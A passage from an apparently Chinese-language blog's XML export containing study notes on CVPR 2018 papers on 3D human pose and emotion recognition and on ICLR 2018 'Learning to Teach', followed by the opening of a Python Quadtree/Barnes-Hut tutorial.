<p>开始进行预测以及可视化结果，本论文的可视化手段颇有新意(不过之前基于面部特征识别情绪似乎已经采用)，命名为Valence-arousal space，特点是<strong>Representing emotions in a continuous space allows to capture more subtle affect states than using a few categorical emotion classes</strong>，如下：</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB15.png" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVB16.png" alt=""></p>
<blockquote>
<p>进行了<strong>RMSE(均方根误差)</strong>、<strong>PCC(皮尔逊积矩相关系数)</strong>、<strong>SAGR(签署协议评分</strong>,原文说明是We use a personalized evaluation protocol for the 7 children.Each child’s individual sessions are split into train/test in a a leave-one-session-out procedure and we report mean results for all children)的对比，如下：<br><img src="http://op72m4y17.bkt.clouddn.com/CVB18.png" alt=""></p>
<h2 id="实验总流程："><a href="#实验总流程：" class="headerlink" title="实验总流程："></a>实验总流程：</h2><p>本论文重点在于实验的开展，所有过程如上</p>
</blockquote>
</blockquote>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote>
<blockquote>
<p>1.本论文已经在自闭症儿童的机器人辅助治疗期间记​​录的非临时视频中引入了大规模的细粒度动作和情绪识别任务。由于大量的序列（超过3,700个），长视频（每个10-15分钟），大量高度变化的动作（37个儿童行动班，19个治疗师行动），并且由于儿童仅部分可见并在非标准相机视点下观察、年龄差异和不可预测的行为增加了挑战。</p>
<blockquote>
<p>拓展&amp;可研究点：(探索中，后续更新</p>
</blockquote>
<p>2.调查了如何结合Feedforward-Feedback组件的最先进的RGB三维人体姿态重建方法如何适应该问题，并基于儿童和治疗师的二维和三维表示评估了多个动作和情绪识别基线。</p>
<blockquote>
<p>拓展&amp;可研究点：(探索中，后续更新</p>
</blockquote>
<p>3.经过模型的适当调整后，RGB数据中的当前二维和三维重建方法与工业级RGB-D Kinect系统相比具有竞争力。行为识别基线在40-50％的性能范围内，本论文引入的大规模数据提出了建模行为的一个挑战，同时影响了计算机视觉和儿童机器人与自闭症应用的交互。</p>
<blockquote>
<p>拓展&amp;可研究点：(探索中，后续更新</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
<blockquote>
<p><strong>Discover Intelligence Future and Create More</strong></p>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      
        <categories>
            
            <category> CVPR_2018 </category>
            
            <category> 论文研读笔记 </category>
            
            <category> 计算机视觉/模式识别 </category>
            
            <category> 场景理解 </category>
            
            <category> 细粒度情绪/动作识别与预测 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DMHS &amp; SMPL </tag>
            
            <tag> DMHSPV &amp; H80KPartial </tag>
            
            <tag> Skeleton Reconstruction </tag>
            
            <tag> Action Classification </tag>
            
            <tag> Continuous Emotion Prediction </tag>
            
            <tag> CNN &amp; RNN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVPR 2018 | Monocular 3D Pose and Shape Estimation of Multiple People in Natural Scenes]]></title>
      <url>http://yikunhaocong.com/2018/06/08/CVPR-2018-Monocular-3D-Pose-and-Shape/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>多人交互场景的视觉感知系统构建 | 本博文为个人理解&amp;整理思路所写，仅供参考</strong><br>    <a href="http://openaccess.thecvf.com/content_cvpr_2018/papers/Zanfir_Monocular_3D_Pose_CVPR_2018_paper.pdf" target="_blank" rel="external">Monocular 3D Pose and Shape Estimation of Multiple People in Natural Scenes - The Importance of Multiple Scene Constraints (CVPR 2018)</a><br><a id="more"></a><br><img src="http://op72m4y17.bkt.clouddn.com/CVA0_5.png" alt=""><p></p>
<h2 id="本论文目标："><a href="#本论文目标：" class="headerlink" title="本论文目标："></a>本论文目标：</h2><blockquote>
<p><strong>a fully automatic monocular visual sensing system for multiple interaction people<br>一个视觉感知系统：对互动中的每个人进行(动作)识别</strong></p>
<blockquote>
<p>(i) infers the 2d and 3d pose and shape of multiple people from a single image, relying on detailed semantic representations at both model and image level, to guide a combined optimization with feedforward and feedback components,</p>
<blockquote>
<p><strong>推断2d和3d的动作，从模型和图片级别的语义表示去识别单图里多人的动作</strong></p>
</blockquote>
<p>(ii) automatically integrates scene constraints including ground plane support and simultaneous volume occupancy by multiple people, and</p>
<blockquote>
<p><strong>自动整合场景约束，包括地平面参照和多人同时占用的空间约束</strong></p>
</blockquote>
<p>(iii) extends the single image model to video by optimally solving thetemporal person assignment problem and imposing coherent temporal pose and motion reconstructions while preserving image alignment fidelity.</p>
<blockquote>
<p><strong>通过优化解决时间人员分配问题并考虑关联时间的姿态和运动重建，同时保持图像对准保真度，将单幅图像模型扩展为视频</strong></p>
</blockquote>
</blockquote>
</blockquote>
<h2 id="本论文的成果："><a href="#本论文的成果：" class="headerlink" title="本论文的成果："></a>本论文的成果：</h2><blockquote>
<blockquote>
<ol>
<li><p>提出了一个融合了2d人体关节检测、语义分割和3d动作识别的feedforward-feedback模块，该模块使用了一个新的语义cost函数，使模型的主体部分和它们对应的语义图片区域对齐，并考虑了估计的不确定性</p>
</li>
<li><p>场景一致性测量包括自动估计和整合地平面约束，以及适应性地避免几个人同时占用相同空间的约束</p>
</li>
<li><p>时间人分配问题基于身体形状、外观和使用Hungarian匹配方法的运动提示，然后求解2d投影和3d时间下的联合多人平滑问题，构成时间流动性约束</p>
</li>
</ol>
</blockquote>
</blockquote>
<h2 id="Multiply-Persons-in-the-Scene-Model构建："><a href="#Multiply-Persons-in-the-Scene-Model构建：" class="headerlink" title="Multiply Persons in the Scene Model构建："></a>Multiply Persons in the Scene Model构建：</h2><h3 id="Multiple-Scene-Constraints概览"><a href="#Multiple-Scene-Constraints概览" class="headerlink" title="Multiple Scene Constraints概览"></a>Multiple Scene Constraints概览</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA1.png" alt=""></p>
<blockquote>
<ol>
<li><p>Np为检测出的不同人的个数，Nf为视频帧的数量</p>
</li>
<li><p>θ为推测出来的最可能的动作状态变量，B为形状参数，T为个体(动作)翻译</p>
</li>
<li><p>Ls: the visual evidence computed in every frame in the form of semantic body part labeling，换句话说就是考虑每一帧有多少部分是可以推断出语义上的人体部位(标签)的，详见式(8)和(9)</p>
</li>
<li><p>Lc 惩罚同一场景里有不同人重叠同一位置的情况</p>
</li>
<li><p>Lg 合并约束：一些人在同一场景里可能有一个公共的支撑平面(也就是参照的地平面)</p>
</li>
<li><p>Lr 高斯混合先验</p>
</li>
</ol>
</blockquote>
</blockquote>
<h3 id="模型基本过程"><a href="#模型基本过程" class="headerlink" title="模型基本过程"></a>模型基本过程</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA2.png" alt=""></p>
<blockquote>
<p>输入图片视频 -&gt; 单个Feedforward-Feedback模型，向前输入人的检测、身体部位的标签和3d动作的初始化结果 | 返回语义上3d的动作和形状表示 - [2d和3d的动作和形状的假设(每个人、每一帧)] - -&gt; 在约束下进行多人联合的优化(约束指的是地平面假设，相互位置空间的非相交，图像对齐)，时间分配|轨迹模型 -&gt; 多人的3d动作和形状重建</p>
<blockquote>
<p>同一个人的轨迹模型形式上可以理解为出现同一个人的连续帧</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA3.png" alt=""></p>
<p>Lt 融合了人体动作的先验知识，例如加速度假设、平滑性等其它从人体动作数据中已学习到的先验模型</p>
<p>最小化Ls和Lc假设B、θ、T相互独立</p>
<p>即使一帧中人体部位可推测的语义量最小(个人理解)，且不同人相互重叠的情况最少,然后再优化物体，加入时间和地平面约束：Lt和Lg<br>对于那些只在几帧中被检测到的人，优化将会在对应的帧子集中继续</p>
</blockquote>
<p><strong>SMPL</strong> [skinned multi-person linear model] -&gt; 主要是人体部位的参数化表示模型,是一个可分离shape和pose的模型</p>
<blockquote>
<p>for learning semantic vertex labeling information, and here the author uses a new semantic loss function<br><strong>SMPL: A skinned multi-person linear model</strong></p>
</blockquote>
<p><strong>DMHS</strong> [Deep Multitask Human Sensing Network] -&gt; 深度学习模型，用于多任务感知人类(动作)的神经网络</p>
<blockquote>
<p>for initial 2d and 3d pose inference (body joints, semantic segmentation, pose prediction)<br><strong>Deep multitask architecture for integrated 2d and 3d human sensing. In CVPR, 2017</strong></p>
</blockquote>
</blockquote>
</blockquote>
<h3 id="Single-Person-Feedforword-Feedback-Model"><a href="#Single-Person-Feedforword-Feedback-Model" class="headerlink" title="Single Person Feedforword-Feedback Model"></a>Single Person Feedforword-Feedback Model</h3><blockquote>
<p>SMPL:微分参数化人体模型,提供一个依赖θ和β的矩阵函数</p>
<blockquote>
<p>θ — 姿势矢量 β — 形状参数</p>
<p>对于每个身体部位，控制姿势的向量以他们的父母在运动树中相对旋转w.r.t的轴角表示提供。(原文写的语义有点问题，此处保留理解)</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA4.png" alt=""></p>
<p>DMHS:输入3通道的图片，输出在像素级别估计人体2d和3d的关节和语义的人体部位</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA5.png" alt=""></p>
</blockquote>
<h3 id="Feedforward-Prediction-Pose-amp-Shape-Transfer"><a href="#Feedforward-Prediction-Pose-amp-Shape-Transfer" class="headerlink" title="Feedforward Prediction, Pose &amp; Shape Transfer"></a>Feedforward Prediction, Pose &amp; Shape Transfer</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA6.png" alt=""></p>
<blockquote>
<p>We propose an alternative transfer equation, focusing on qualitatively modeling the pose predicted by DMHS so to preserve the 3d orientation of limbs.</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA7.png" alt=""></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA8.png" alt=""></p>
<blockquote>
<p>接着可视化了一下反馈的语义对3d重建的重要作用</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA9.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA10.png" alt=""> </p>
<blockquote>
<p>Ns个语义类，yS个存储的语义置信度对应，也就是像素上的不同值对应于不同语义的一个概率</p>
<p>fS(p)输出最有可能的语义，即令ys(p,k)最大，取参数k</p>
<p>(x,y)代表的是像素点p的位置，k代表的是语义的编号</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA11.png" alt=""></p>
<blockquote>
<p>语义Loss函数即J的loss和S的loss，此处S的loss为每个语义类与推断为该语义的所有位置的概率(置信度) x 与该位置最近而且同时隐含其它语义类的位置的距离 (个人理解)</p>
<blockquote>
<p>这里有一个规则化，即1/Z，与推断出来语义类的位置的数量相关；这个新loss的加入是为了进一步考虑拍摄景深、照相机光线等不确定因素，当置信度越小时整个S的loss权重就越小，反映了外界因素的影响，增加了不确定的约束。</p>
</blockquote>
</blockquote>
</blockquote>
<h3 id="Simultaneous-Volume-Occupancy-Exclusion"><a href="#Simultaneous-Volume-Occupancy-Exclusion" class="headerlink" title="Simultaneous Volume Occupancy Exclusion"></a>Simultaneous Volume Occupancy Exclusion</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA12.png" alt=""></p>
<blockquote>
<p>p, p’ 为不同人，对人体每个肢体进行超二次曲面分割，然后再细分为多个内置球体，总共可分为Nb个球体，i, j分别为两个人不同部位球体的半径</p>
</blockquote>
<p><strong>这个可以理解为人体接触的部位越多，距离越近，空间交错的loss就越大</strong></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA13.png" alt=""></p>
</blockquote>
<h3 id="Ground-Plane-Estimation-and-Constraint"><a href="#Ground-Plane-Estimation-and-Constraint" class="headerlink" title="Ground Plane Estimation and Constraint"></a>Ground Plane Estimation and Constraint</h3><blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/CVA14.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA15.png" alt=""></p>
<blockquote>
<p>Xl和Xr分别为左右脚踝的位置,上面的loss计算的是脚踝位置对于参造地平面的(空间角度)距离远近，越远则loss越大</p>
</blockquote>
</blockquote>
<h3 id="Assignment-and-Trajectory-Optimization"><a href="#Assignment-and-Trajectory-Optimization" class="headerlink" title="Assignment and Trajectory Optimization"></a>Assignment and Trajectory Optimization</h3><blockquote>
<p>To solve the person assignment problem, we use the Hungarian algorithm to optimally build tracks based on an inter-frame inter-person cost combining the appearance consistency (measured as distances between vectors containing the median colors of the different body parts, computed over the model vertices), the body shape similarity, and the distance between the appropriately translated 3d joints inferred for each person, at frame level.<br><img src="http://op72m4y17.bkt.clouddn.com/CVA16.png" alt=""></p>
<blockquote>
<p>对于每个人的时间loss函数(大于1帧)，用θ表示姿势的角度，t表示(躯体动作)翻译的变量，实际上就是二元的二阶差分</p>
</blockquote>
</blockquote>
<h2 id="实验总流程："><a href="#实验总流程：" class="headerlink" title="实验总流程："></a>实验总流程：</h2><blockquote>
<blockquote>
<ol>
<li><p>给一段有多个人的视频</p>
</li>
<li><p>首先检测在每一帧里的人和获得初始DMHS对2d身体关节的前向预估、语义分割和3d姿势<br>过程：扩展DMHS使的它能够识别不完整人体，这个在接下来的一篇里(3D Human Sensing, Action and Emotion Recognition in Robot Assisted Therapy of Children with Autism)会讲到</p>
</li>
<li><p>对于每个人我们进行转换，对齐由DMSH预测的3d四肢方向和SMPL的方向<br>结果：转换后生成了姿势和形状的初始状态,接下来返回语义上3d的动作和形状表示 - [2d和3d的动作和形状的假设(每个人、每一帧)] - -&gt; 在约束下进行多人联合的优化(约束指的是地平面假设，相互位置空间的非相交，图像对齐)，时间分配|轨迹模型 -&gt; 多人的3d动作和形状重建</p>
</li>
</ol>
</blockquote>
</blockquote>
<h2 id="实验结果："><a href="#实验结果：" class="headerlink" title="实验结果："></a>实验结果：</h2><blockquote>
<blockquote>
<p>用了Human3.6M和 CMU Panoptic Dataset两个数据集的部分数据，评估手段详见论文<br><img src="http://op72m4y17.bkt.clouddn.com/CVA18.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA19.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA20.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA21.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/CVA22.png" alt=""></p>
</blockquote>
</blockquote>
<h2 id="需要仔细理解的概念："><a href="#需要仔细理解的概念：" class="headerlink" title="需要仔细理解的概念："></a>需要仔细理解的概念：</h2><blockquote>
<ol>
<li><p>Parametric human and scene modeling</p>
</li>
<li><p>Deep multi-task neural networks</p>
</li>
<li><p>Hungarian匹配方法 / Hungarian algorithm</p>
</li>
<li><p>fluidity constraints 流动性约束</p>
</li>
<li><p>Gaussian mixture prior</p>
</li>
<li><p>SMPL/DMHS</p>
</li>
<li><p>Rodrigues transformation</p>
</li>
<li><p>Kinematic tree</p>
</li>
<li><p>A standard skeletal rig</p>
</li>
<li><p>Constant velocity priors on pose angles</p>
</li>
</ol>
</blockquote>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote>
<ol>
<li><p>本文通过结合2d和3d模型并对多人场景约束进行建模，构建了前向预测器(初始化状态)和反向反馈语义(细化地嵌入)的模块来进行多人场景的3d重建</p>
<blockquote>
<p>拓展&amp;可研究点：(将会在后续两篇论文解析后更新</p>
</blockquote>
</li>
<li><p>综合考虑了地平面约束、多人空间占用约束和时间连续性(考虑采用先验模型进行平滑操作)等，在时间和空间上加入的约束使得多人场景(pose&amp;shape)重建的准确度提高</p>
<blockquote>
<p>拓展&amp;可研究点：(后续更新</p>
</blockquote>
</li>
<li><p>开创性地构建了一个添加多重场景约束的自动化多人场景感知的系统</p>
<blockquote>
<p>拓展&amp;可研究点：(后续更新</p>
</blockquote>
</li>
</ol>
<blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
<blockquote>
<p><strong>“When reality is not as good as ideal, a fighter will accept it; When reality is close to ideal, a fighter will explore their distance.”</strong></p>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      
        <categories>
            
            <category> CVPR_2018 </category>
            
            <category> 论文研读笔记 </category>
            
            <category> 计算机视觉/模式识别 </category>
            
            <category> 语义分割与场景理解 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DMHS &amp; SMPL </tag>
            
            <tag> Multiple Scene Constraints </tag>
            
            <tag> Feedforward-Feedback Model </tag>
            
            <tag> Kinematic tree </tag>
            
            <tag> Hungarian algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ICLR 2018 | Learning to Teach 论文品读]]></title>
      <url>http://yikunhaocong.com/2018/05/07/L2T/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>“是故学然后知不足，教然后知困。知不足然后能自反也，知困然后能自强也。故曰教学相长也。”——《礼记·学记》</strong><br>    <a href="https://openreview.net/pdf?id=HJewuJWCZ" target="_blank" rel="external">Learning to Teach, Yang Fan, Fei Tian,Tao Qin, Xiang-Yang Li, Tie-Yan Liu, Proceedings of Sixth International Conference on Learning Representations (ICLR 2018)</a><br><a id="more"></a><p></p>
<h2 id="传统的机器学习算法和最近的自动学习算法"><a href="#传统的机器学习算法和最近的自动学习算法" class="headerlink" title="传统的机器学习算法和最近的自动学习算法"></a>传统的机器学习算法和最近的自动学习算法</h2><p>它们重点都在于如何让AI更好地学习：两种学习算法的训练过程都是在固定的数据集上，通过最小化固定的损失函数（Loss Function），优化得到位于模型假设空间（Hypothesis Space）里最优的模型。而两者差别仅仅在于优化过程是否是自动进行的，这一定程度上限制了自动学习技术的潜力。</p>
<h2 id="Learning-to-Teach"><a href="#Learning-to-Teach" class="headerlink" title="Learning to Teach"></a>Learning to Teach</h2><p>通过和人类社会的学习机制对比，我们发现传统的机器学习和近年来的自动学习都忽略了一个很重要的方面：它们只学而不教。无论是训练数据、损失函数，还是模型的假设空间，都对应着人类教学过程里的若干重要环节。因此我们试图打破对于训练数据、损失函数和模型假设空间的限制，把教学这一重要的概念集成到机器学习系统中，使得人工智能和机器学习算法得以教学相长。我们将这一框架命名为“学习教学”（Learning to Teach，简写为L2T）。其中涵盖了若干个关键问题：</p>
<ul>
<li><p>1.<strong>数据教学力图为机器学习过程寻找到最优的训练集。</strong>训练数据对应人类教学过程中的教育材料，例如教科书。</p>
</li>
<li><p>2.<strong>损失函数教学力图为机器学习过程寻找到最优的损失函数。</strong>这类比于人类教学过程中，优秀的教师会通过高质量的测试过程来评估学生的学习质量，并对其进行引导。</p>
</li>
<li><p>3.<strong>模型空间教学力图为机器学习过程定义最优的模型假设空间。</strong>例如在训练的初期，我们可能会倾向于使用简单的线性模型来尽快学习到数据里的规律，而在训练的末期，我们可能更愿意选择复杂的深度模型来使得性能得到进一步增强。这类比于教师教授给学生的技能集合（Skills Set）：小学生只会学习到简单的数字运算，中学生则会学习到基本的代数知识，到了大学，微积分则成为了必备的技能。</p>
</li>
</ul>
<h2 id="How-to-solve"><a href="#How-to-solve" class="headerlink" title="How to solve"></a>How to solve</h2><p>为了解决这些问题，我们定义了两个模型：学生模型和教师模型。前者即为通常意义下的机器学习模型，后者则负责为前者提供合适的数据、损失函数，或者模型假设空间。在下图中，我们简单展示了两个模型的完全自动化训练过程：在学生模型训练的每一步t，教师模型得到学生模型的状态向量（用于反映学生模型当前的状态），根据自身参数输出教学策略，诸如当前需要使用的训练数据、损失函数，或者优化的模型空间，反馈给学生模型。学生模型基于此进行一步优化（例如梯度下降），更新其参数。之后学生模型会将一个奖励信号（例如开发集上的准确率）反馈给教师模型。教师模型基于该信号对自己的教学策略进行优化更新。这样的过程循环往复直至教师模型收敛。<br><img src="5" alt="L2T的训练过程"></p>
<h2 id="接着从头把公式撸一撸"><a href="#接着从头把公式撸一撸" class="headerlink" title="接着从头把公式撸一撸"></a>接着从头把公式撸一撸</h2><p><img src="http://op72m4y17.bkt.clouddn.com/L1.png" alt=""></p>
<p>=&gt; R(W)是参数W的风险函数，注意不要把R理解为强化学习中的Reward奖励函数噢(强化学习的步骤在后面才有讲，它只是本文用来训练教师模型的一个手段)，在下面的教师模型中有说明，这里指的是Risk(W)</p>
<p>=&gt; M是预测结果(离散型)或输出结果(连续型)的评估矩阵，由于M矩阵一般是离散值并且难以被优化，所以模型中构造Loss函数来对预测值进行评估。如果模型是为了寻找一个好的假设函数f，假设函数集合空间需要先给出</p>
<p>=&gt; P(x,y)=P(x)P(y|x)是(x,y)的联合分布概率函数，刚开始是未知的,所以寻找最优预测函数f是基于训练集D{xi,yi}的</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L2.png" alt=""></p>
<p>=&gt; 模型的(教学成果)目标函数，即通过训练教师/学生模型最小化基于已定义学习算法u的Loss函数，并得到最优化学习网络参数W的目标。实际上这里的参数w可以理解为学生模型的参数，这是学生的一个训练模型，因为下面：</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L3.png" alt=""></p>
<p><strong>=&gt; 模型的(教学水平)目标函数，即通过最小化测试集数据在学生模型学习算法上的风险(也就是它的Loss函数)来最优化教师模型的目标(可以是数据集空间D，Loss假设函数空间L，或模型假设函数空间)</strong></p>
<p>=&gt; 这里需要说明的一点是，这篇论文只在数据集空间D上进行了Learning to Teach的实验</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L4.png" alt=""></p>
<p>=&gt; 框架说明，了解过Reinforcement learning基本步骤的小伙伴应该不难理解，基于前面状态的转移并采取行动A,<strong>但这里有个改进，除了考虑教师的历史状态，还综合考虑了学生模型的前一步状态(有种RNN/LSTM隐藏状态H(n-1)的感觉)，所以下面有对学生模型状态的表示进行说明</strong></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L5.png" alt=""></p>
<p>=&gt; 整个Learning to Teach模型综合起来的核心目标函数</p>
<p>=&gt; 使用强化学习的手段来正反馈训练教师模型。(<strong>注意，除了RL还可以使用其他手段来训练</strong>) 这里的r就是reward奖励函数啦，通过最大化教师的奖励值来对教师模型的指导输出做优化，得到最终的教师模型。 这个过程是通过与学生模型的输出和Loss(准确点叫做风险函数R(w)，因为教师模型不一定是指导生成最好的Loss函数来加快训练，有可能是指导生成数据集加快训练速度，或者指导选择模型)</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L7.png" alt=""></p>
<p>=&gt; 论文的实验内容，让教师模型学会选择适当批次的数据和抛弃效果不好的训练集数据批次，来加快学生模型的训练，基于随机梯度下降SGD可以得到训练集的批次序列，<strong>实际上教师模型最终学习到的是如何决定哪些批次数据比较重要和哪些可以扔掉的能力</strong>，从而达到提高主模型(学生模型)训练效果的目的。</p>
<h3 id="接下来是为教师-学生模型的交互进行建模"><a href="#接下来是为教师-学生模型的交互进行建模" class="headerlink" title="接下来是为教师/学生模型的交互进行建模"></a>接下来是为教师/学生模型的交互进行建模</h3><p><img src="http://op72m4y17.bkt.clouddn.com/L8.png" alt=""></p>
<p>=&gt; 对训练批次(总共有M批)进行简单的0/1状态编码，0代表不重要可以去除，1代表对训练过程有作用需要保留</p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L9.png" alt=""></p>
<p>=&gt; 将学生模型训练收敛的速度作为教师模型奖励函数的指标，定义了一个奖励函数<strong>r_T= -log(i_acc/T’), T’是预设的最大训练迭代次数， i_acc是选择某个批次序列状态进行训练并能使准确率超过阈值的最小训练批次数</strong></p>
<p><img src="http://op72m4y17.bkt.clouddn.com/L10.png" alt=""></p>
<p>=&gt; 状态特征的描述，<strong>学生模型状态：用一些比较简单的特征例如达到准确率阈值的最小迭代次数，平均历史训练loss和历史验证集准确率</strong></p>
<p>=&gt; <strong>用来表示数据和学习者模型的特征(基于已有的研究方法来表示)：1.每个类的预测可能性；2.在数某个数据集上的loss值；3.边界值等</strong></p>
<p>=&gt; 不得不说，上述的这些特征对模型训练可能会有关键作用，值得好好研究一下。</p>
<h3 id="论文实验结果"><a href="#论文实验结果" class="headerlink" title="论文实验结果"></a>论文实验结果</h3><ul>
<li>具体结果可以参见论文<br><img src="http://op72m4y17.bkt.clouddn.com/L13.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/L11.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/L12.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/L16.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/L15.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/L14.png" alt=""></li>
</ul>
<blockquote>
<p><strong>“The achievements of genius is produced by 99% of sweat plus 1% of talent, let alone me.”</strong></p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 论文研读笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Reinforcement learning </tag>
            
            <tag> MSRA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[确认过眼神，四叉树Barnes-Hut算法的py实现]]></title>
      <url>http://yikunhaocong.com/2018/04/29/barnes-hut/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2><br>    <strong>本博文紧接上一篇，主要讲解自己实现的Quadtree和Barnes–Hut算法py版本，附上我的github地址<a href="https://github.com/Kali-Hac/YifanHu_python/tree/master/Barnes_Hut" target="_blank" rel="external">https://github.com/Kali-Hac/YifanHu_python/tree/master/Barnes_Hut</a></strong><br><a id="more"></a><p></p>
<h2 id="开讲前准备"><a href="#开讲前准备" class="headerlink" title="开讲前准备"></a>开讲前准备</h2><ul>
<li>先来点干粮，相信看完<strong>这一篇</strong><a href="https://blog.csdn.net/baimafujinji/article/details/53036473" target="_blank" rel="external">Barnes-Hut算法（quad-tree的一个应用）</a>基本就能理透Barnes-Hut算法的原理了,但是光理解还不行，接下来就动动手跟我一起逐步构建这棵有点深的树</li>
</ul>
<h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><ul>
<li>对着代码讲解，可以边实践边理解，在这个过程中我会把一些知识点重新强调一下原理，力求最大限度地将思路讲解清楚</li>
</ul>
<h3 id="代码结构，1个类中7个函数"><a href="#代码结构，1个类中7个函数" class="headerlink" title="代码结构，1个类中7个函数"></a>代码结构，1个类中7个函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">class Quadtree:</div><div class="line">	def __init__(self, min_x, min_y, size, max_dep):</div><div class="line">		self.min_x = min_x  # (树所在)区域最小x坐标</div><div class="line">		self.min_y = min_y  # （树所在）区域最小y坐标</div><div class="line">		self.size = size  # (树所在)区域大小</div><div class="line">		self.isleaf = True  # 是否为叶子节点</div><div class="line">		self.max_dep = max_dep  # 该树最大四分深度</div><div class="line">		self.mass = 0  # (树所在)区域重量</div><div class="line">		self.children = []  # 保存子树</div><div class="line">		self.mass_center = [0.0, 0.0]  # 区域重心</div></pre></td></tr></table></figure>
<h3 id="1-将区域四等分，生成子树"><a href="#1-将区域四等分，生成子树" class="headerlink" title="1.将区域四等分，生成子树"></a>1.将区域四等分，生成子树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># 1.将区域四等分，生成子树</div><div class="line">def quad_divide(self):</div><div class="line">	global axes</div><div class="line">	# 如果已经到最大分割层次，则不再切割，放置在原区域</div><div class="line">	if self.max_dep == 0:</div><div class="line">		if len(self.children) == 0:</div><div class="line">			# change</div><div class="line">			self.children = [self]</div><div class="line">	else:</div><div class="line">		# 将一个区域分割为四个子区域</div><div class="line">		children_size = self.size / 2.0</div><div class="line">		if visualization:</div><div class="line">			visualize_divide([self.min_x, self.min_x + self.size], [self.min_y + children_size, self.min_y + children_size])</div><div class="line">			visualize_divide([self.min_x + children_size,self.min_x + children_size], [self.min_y, self.min_y + self.size])</div><div class="line">		self.isleaf = False</div><div class="line">		self.children.append(Quadtree(self.min_x, self.min_y + children_size, children_size, self.max_dep - 1))</div><div class="line">		self.children.append(Quadtree(self.min_x + children_size, self.min_y + children_size, children_size, self.max_dep - 1))</div><div class="line">		self.children.append(Quadtree(self.min_x, self.min_y, children_size, self.max_dep - 1))</div><div class="line">		self.children.append(Quadtree(self.min_x + children_size, self.min_y, children_size, self.max_dep - 1))</div></pre></td></tr></table></figure>
<blockquote>
<p>此处我们用可视化的手段来观察节点插入的过程区域的变化(在源代码里已经写好了，可以通过将visualization设置为True来开启):</p>
</blockquote>
<p><img src="http://op72m4y17.bkt.clouddn.com/Figure_1.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-1.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-2.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-3.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-4.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-5.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-6.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-7.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-8.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/Figure_1-9.png" alt=""></p>
